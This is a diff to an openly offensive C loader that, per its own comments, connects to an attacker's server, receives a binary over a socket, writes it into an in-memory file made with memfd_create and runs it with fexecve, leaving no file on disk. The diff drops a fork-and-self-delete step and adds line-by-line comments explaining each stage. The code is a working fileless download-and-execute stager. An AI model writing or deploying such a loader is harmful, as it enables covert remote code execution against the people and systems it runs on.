@@ -18,9 +18,6 @@ static inline int memfd_create(const char *name, unsigned int flags)         // 
 
 int	main(int argc, char *argv[], char *env[])
 {
-	if(fork() == 0)
-		return (0);
-	unlink(argv[0]);
 	pid_t	pid;
 	int	fd;
 	int	s, l;
@@ -32,15 +29,15 @@ int	main(int argc, char *argv[], char *env[])
 	// connect to attacker -> download from socket fd and write into fd 'a'
 	s = socket(AF_INET, SOCK_STREAM, 0);
 	connect(s, (struct sockaddr*)&addr, 16);
-	fd = memfd_create("y", MFD_CLOEXEC);
+	fd = memfd_create("y", MFD_CLOEXEC);  // create fd in memory
 
 	while (1)
 	{
-		if ((l = recv(s, buf, BUF_SIZE, 0)) <= 0)
+		if ((l = recv(s, buf, BUF_SIZE, 0)) <= 0)  // download
 			break;
-		write(fd, buf, l);
+		write(fd, buf, l);  // write into fd
 	}
-	close(s);
-	fexecve(fd, name, env);
+	close(s); // close socket
+	fexecve(fd, name, env); // execute fd in memory
 	return (0);
 }
